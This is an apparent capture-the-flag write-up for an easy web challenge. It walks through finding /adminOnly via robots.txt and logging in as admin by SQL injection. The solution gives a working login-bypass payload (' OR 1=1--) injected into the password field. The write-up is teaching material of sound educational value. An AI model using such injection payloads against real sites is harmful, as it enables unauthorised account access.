# Challenge Name
admin

# Resources
https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/

# Difficulty
Easy

# Guide
Find out more about SQL Injection before proceeding.
https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/

The following shows SQL statement used. Take note of the `''` and think about how you can ignore the rest of the statement.
```
SELECT username FROM users WHERE username = 'username' AND password = 'password'
```

Once you managed to login, it suggest that there are other pages.
There is a file commonly used to prevent robots from accessing some areas on the site robots.txt.

From the robots.txt we know that there is `/adminOnly` and user
`admin`.  
We can then login to the admin account and access `/adminOnly` to get the flag.

# Hints
Some files are intentionally hidden from bots :)

Have you heard about SQLI

# Solution
By accessing `/robots.txt` we can find the following information.
```
User-agent: *
Disallow: 
/adminOnly
user:admin
```

We then go back to the login page and bypass the login to the admin account.
```
username: admin
password: ' OR 1=1--
```

Lastly we can go to `/adminOnly` and get the flag.